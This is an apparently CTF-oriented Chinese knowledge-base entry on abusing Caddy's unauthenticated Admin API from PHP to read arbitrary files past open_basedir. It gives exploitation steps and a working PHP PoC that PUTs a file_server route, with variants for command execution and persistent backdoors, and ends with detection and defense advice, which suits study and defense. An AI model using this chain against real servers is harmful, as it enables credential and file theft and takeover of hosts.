---
id: web-php-open-basedir-bypass-caddy-admin-api-file-server-read
title: Caddy Admin API 127.0.0.1:2019 未授权配置改写：新增 file_server route 读任意文件绕过 PHP open_basedir
type: scenario
domain: web
path: web/php/open-basedir-bypass
technique: caddy-admin-api-file-server-open-basedir-bypass
aliases:
- Caddy Admin API 任意文件读取
- FrankenPHP Caddy 配置 API
- open_basedir 绕过 file_server
- 127.0.0.1:2019 config API
- Caddy route 注入
- strip_path_prefix
tags:
- php
- caddy
- frankenphp
- open-basedir-bypass
- admin-api
- file-read
- ssrf
- config-injection
- localhost
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T13:44:45+08:00'
  notes: 已对照原文与图10-19核对：Caddy admin 默认 localhost:2019、/config 支持 GET/POST/PUT/PATCH/DELETE；POST 追加 route 被前置 try_files 改写失败，PUT routes/0 + rewrite strip_path_prefix /_fs + file_server root / 成功读 /etc/passwd、/etc/hosts，均与原文一致；未在本机复跑
---

## 一句话结论

当 PHP 应用运行在 FrankenPHP/Caddy 下时，Caddy 的 Admin API 默认监听 `127.0.0.1:2019` 且无认证；攻击者用 PHP 的 `file_get_contents` 加 HTTP stream context 向 `/config/apps/http/servers/srv0/routes/...` 写入一条带 `file_server`、`root="/"` 的 route，就能让 Caddy 进程读取 PHP `open_basedir` 之外的文件（含 `/etc/passwd`、flag 等），因为限制只作用于 PHP 自身。

## 原理

- **Admin API 默认暴露在本机**：Caddy 的 admin endpoint 默认 `localhost:2019`，未配置 `admin off` 或额外认证时可从同机任意进程访问；`/config/` 路径支持 GET/POST/PUT/PATCH/DELETE，可读取和运行时修改整份 Caddy 配置。
- **route 可运行时追加/替换**：Caddy 的 HTTP server 配置位于 `apps.http.servers.srv0.routes`；现有 `php_server` 生成的 route 链末尾有 `file_server`，但请求会先被前面的 `try_files`/`rewrite` 处理。直接 POST 追加的 route 可能排在后面而被前面规则改写（如落到 index.php），用 PUT 覆盖 `routes/0` 可以确保新 route 优先命中。
- **用 file_server 读文件**：`file_server` handler 会把请求路径拼到其 `root` 下读取并返回；把 `root` 设为 `/` 即可读整个文件系统，`browse` 可列目录。读取由 Caddy 进程完成，不经过 PHP 的 `open_basedir` 检查，因此 PHP 层限制失效。
- **前缀挂载**：为方便访问可加一条 `match: path /_fs/*` 的 route，handle 链先 `rewrite` 去掉 `/_fs` 前缀，再交给 `file_server`。注意去前缀应使用 `strip_path_prefix` 字段，而不是在 `uri` 模板里写 `strip_prefix`，否则路径不会按预期改写。
- **PHP 侧请求能力**：`file_get_contents` 默认只发 GET，但可用 `stream_context_create` 指定 `method=POST/PUT`、`Content-Type: application/json`、`content=json_encode($route)`；即使 `curl_*`/`exec` 被禁用，`file_get_contents` 仍可发起本机 HTTP 请求。
- **危害**：从"只能读 open_basedir 内文件"升级为读取任意文件；若配置中还开放了其它 handler，还能进一步改路由/劫持请求。

## 触发条件

- 目标为 FrankenPHP/Caddy 部署，Admin API 使用默认 `127.0.0.1:2019` 且未关闭/未加认证。
- 攻击者已在 PHP 层取得代码执行（如上传 WebShell、模板注入等），可调用 `file_get_contents`/`stream_context_create`。
- `open_basedir`/`disable_functions` 限制了 PHP 读写与命令执行，但未限制本机 HTTP 请求。
- Caddy 进程对目标文件有读权限（通常以 Web 用户运行，可读 `/etc/passwd`，flag 权限取决于部署）。
- 配置路径中 server 名为 `srv0`（Caddy 默认），或可从 `/config/` 返回的 JSON 中获知实际名称。

## 利用步骤

1. 用 PHP 读取 `http://127.0.0.1:2019/config/`，确认 Admin API 可达并取得 `apps.http.servers` 下的 server 名与 routes 结构。
2. 构造恶意 route：`match: [["path" => ["/_fs/*"]]]`，`handle: [["handler"=>"rewrite","strip_path_prefix"=>"/_fs"], ["handler"=>"file_server","root"=>"/","browse"=>(object)[]]]`。
3. 用 `stream_context_create` 以 PUT 方法把该 route 写到 `/config/apps/http/servers/srv0/routes/0`，覆盖第一条 route 以确保优先级；若只想追加，需确认它排在前面的 try_files 之前。
4. 访问 `http://target/_fs/etc/passwd`，由 Caddy 的 file_server 返回文件内容。
5. 把路径换成 `/flag`、`/app/...`、`/proc/self/environ` 等目标；必要时用 `browse` 列目录。
6. 若需要命令执行，继续利用同一 Admin API 修改 `apps.frankenphp.php_ini` 清空 `disable_functions`/`open_basedir`。

## PoC

```php
<?php
$route = [
    "match" => [["path" => ["/_fs/*"]]],
    "handle" => [
        ["handler" => "rewrite", "strip_path_prefix" => "/_fs"],
        ["handler" => "file_server", "root" => "/", "browse" => (object)[]],
    ],
];

$ctx = stream_context_create([
    "http" => [
        "method" => "PUT",
        "header" => "Content-Type: application/json\r\n",
        "content" => json_encode($route),
        "ignore_errors" => true,
        "timeout" => 1,
    ],
]);

file_get_contents(
    "http://127.0.0.1:2019/config/apps/http/servers/srv0/routes/0",
    false,
    $ctx
);

// 访问 http://target/_fs/etc/passwd
```

若只想追加而非覆盖，可 POST 到 `/config/apps/http/servers/srv0/routes`，但需处理 route 顺序（前面的 `try_files` 可能先把请求改写到 `index.php`）。

## 变体与关联

- 变体：把 `root` 指向 `/app`、`/proc`、`/var/log` 等目录读取源码、环境变量、日志；用 `browse` 枚举目录。
- 变体：修改 `routes` 中的 `php` handler 或 `vars.root`，把后续请求导向攻击者控制目录，形成持久化后门。
- 变体：Admin API 若改到非默认端口或 Unix socket，可先通过 `/proc/net/tcp`、Caddy 配置或错误信息定位。
- 关联：[[web-php-open-basedir-bypass-classic-methods]]（PHP 层 open_basedir 绕过）、[[web-php-rce-frankenphp-php-ini-disable-functions-bypass]]（同一 Admin API 的 php_ini 注入）、[[web-php-frankenphp-splitpos-unicode-casefold-path-differential]]（同一题的上传解析差异入口）。

## 检测与防御

- 防御：Caddy 配置 `admin off` 或改为 Unix socket，并加认证/访问控制；不要把 Admin API 暴露给 Web 应用所在用户。
- 防御：以低权限用户运行 Caddy，限制其可读目录；使用容器/只读挂载缩小文件系统可见范围。
- 检测：监控 `127.0.0.1:2019/config` 的 POST/PUT/PATCH/DELETE；审计 routes 中出现 `file_server` + `root="/"`、`strip_path_prefix` 等异常配置；关注 PHP 进程向本机 2019 端口的请求。
- 说明：open_basedir 只约束 PHP 自身，不能约束同机的其它服务；PHP 代码执行后应假设可横向访问本机管理接口。
